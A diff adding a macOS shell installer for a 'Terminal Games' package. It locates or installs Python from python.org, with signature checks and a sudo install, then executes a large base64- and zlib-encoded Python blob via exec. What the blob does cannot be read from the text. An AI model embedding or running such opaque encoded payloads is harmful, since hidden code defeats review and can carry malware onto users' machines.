@@ -1,0 +1,25 @@
+#!/bin/sh
+set -eu
+app_dir=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
+fail() { printf '%s\n' "$1" 'Press Enter to close.'; read -r answer; exit 1; }
+python_bin=''
+for candidate in /Library/Frameworks/Python.framework/Versions/3.13/bin/python3 /opt/homebrew/bin/python3 /usr/local/bin/python3 python3; do
+    if "$candidate" -c 'import sys; assert sys.version_info >= (3,9)' >/dev/null 2>&1; then python_bin="$candidate"; break; fi
+done
+if [ -z "$python_bin" ]; then
+    printf '%s\n' 'Python is missing. Downloading the official Python installer...' 'macOS may ask for your administrator password to install Python.'
+    download_dir=$(mktemp -d "${TMPDIR:-/tmp}/terminal-games.XXXXXX")
+    trap 'rm -rf "$download_dir"' EXIT HUP INT TERM
+    pkg="$download_dir/python.pkg"
+    curl --fail --location --proto '=https' --tlsv1.2 --connect-timeout 20 --max-time 600 'https://www.python.org/ftp/python/3.13.17/python-3.13.17-macos11.pkg' -o "$pkg" || fail 'Python download failed. Check your connection and run START HERE again.'
+    pkgutil --check-signature "$pkg" > "$download_dir/signature.txt" || fail 'Python installer signature check failed.'
+    grep -q 'Python Software Foundation' "$download_dir/signature.txt" || fail 'Unexpected installer publisher.'
+    sudo /usr/sbin/installer -pkg "$pkg" -target / || fail 'Installation was cancelled or failed. Run START HERE again to retry.'
+    python_bin=/Library/Frameworks/Python.framework/Versions/3.13/bin/python3
+    if [ -f '/Applications/Python 3.13/Install Certificates.command' ]; then
+        sh '/Applications/Python 3.13/Install Certificates.command' || fail 'Certificate setup failed. Check your connection and run Install Certificates.command in Applications/Python 3.13.'
+    fi
+fi
+"$python_bin" -c 'import sys; assert sys.version_info >= (3,9)' || fail 'Python installation could not be verified.'
+export PATH="$(dirname -- "$python_bin"):$PATH"
+"$python_bin" -c "import base64,zlib;exec(compile(zlib.decompress(base64.b64decode('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')),'<Terminal Games installer>','exec'))" || fail 'Install or launch failed. Run this installer again to retry.'
